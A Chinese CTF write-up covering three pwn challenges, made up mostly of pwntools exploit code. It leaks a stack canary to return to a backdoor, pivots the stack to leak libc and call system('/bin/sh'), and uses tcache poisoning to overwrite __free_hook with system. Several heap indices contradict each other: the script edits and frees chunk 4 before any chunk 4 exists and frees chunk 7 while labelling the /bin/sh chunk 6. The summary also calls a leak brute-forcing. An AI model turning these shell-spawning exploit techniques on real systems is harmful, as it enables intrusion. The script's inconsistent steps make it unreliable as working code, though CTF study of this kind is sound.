---
title: F.Z.N CTF网络安全大赛PWN方向题解
contest: F.Z.N CTF
year: 2024
difficulty: medium
vuln_type: heap_exploit
tags: [pwn, canary, stack-pivoting, tcache-poisoning, i386, amd64, ret2libc]
attack_chain:
  - 题1 canary (i386): 栈溢出覆盖返回backdoor(0x8049285)
  - 泄露canary: A*0x64+B 接收到\x00+3字节
  - 题2 stack_pivoting_x64: 栈迁移leave_ret
  - 泄露栈地址: A*0x28+B*8接收6字节
  - rsp_addr=stack_leak-0x40
  - 题3 attachment 堆题: tcache poisoning
  - 0x418+0x20unsorted bin leak libc (libc2.27 main_arena+96=0x3ebca0)
  - tcache 0x68改fd指向__free_hook
  - 分配两次第二次覆盖__free_hook=system
  - delete带/bin/sh的chunk触发system
key_payload: edit(4, p64(__free_hook)); add(0x68, p64(system)); delete(7)  # /bin/sh
one_liner: F.Z.N PWN 3题：canary爆破+stack_pivoting+tcache poisoning
lesson: 栈迁移rsp=leak-0x40+leave_ret；tcache改fd指向__free_hook
quality: high
---

# F.Z.N CTF网络安全大赛PWN方向题解

## 题目信息
- 比赛：F.Z.N CTF
- 方向：PWN

## 关键攻击链
### 题 1：canary（i386）
```python
backdoor = 0x8049285
payload = b'A'*0x64 + b'B'
p.sendafter(b'number?\n', payload)
p.recvuntil(b'AB')
canary = u32(b'\x00' + p.recv(3))
payload = b'a'*0x64 + p32(canary) + p32(0xdeadbeef)*3 + p32(backdoor)
p.send(payload)
```

### 题 2：stack_pivoting_x64
```python
payload = b'A'*0x28 + b'B'*0x8
p.sendafter(b'name\n\n', payload)
p.recvuntil(b'ABBBBBBBB')
stack_leak = u64(p.recv(6).ljust(8, b'\x00'))
rsp_addr = stack_leak - 0x40
leave_ret = 0x401256
pop_rdi_ret = 0x401275
ret_addr = 0x40101a
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = elf.sym['main']

payload = p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload += p64(0xdeadbeef) + p64(rsp_addr) + p64(leave_ret)
p.sendlineafter(b'message\n\n', payload)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
```
- LibcSearcher 找 system 和 /bin/sh 偏移
- 第二轮 payload: `ret+pop_rdi+binsh+system+main+leave_ret`

### 题 3：attachment 堆题（tcache poisoning）
```python
# Step 1: 泄露 libc - unsorted bin
add(0x418, b'A'*8)  # 块 0
add(0x20, b'B'*8)   # 块 1 防合并
delete(0)           # unsorted bin
data = show(0)
leak = u64(data[:8].ljust(8, b'\x00'))
libc_base = leak - 0x3ebca0  # libc-2.27 main_arena+96
__free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f420

# Step 2: tcache poisoning
add(0x68, b'D'*8)  # 块 2
add(0x68, b'E'*8)  # 块 3
delete(4)  # 进 tcache
edit(4, p64(__free_hook))  # 改 fd
add(0x68, b'F'*8)  # 块 4 (原块 2)
add(0x68, p64(system))  # 块 5 覆写 __free_hook

# Step 3: 触发
add(0x20, b'/bin/sh\x00')  # 块 6
delete(7)  # system("/bin/sh")
```

## 评分
- quality: high（3 题完整 exp：canary爆破+栈迁移+tcache poisoning）
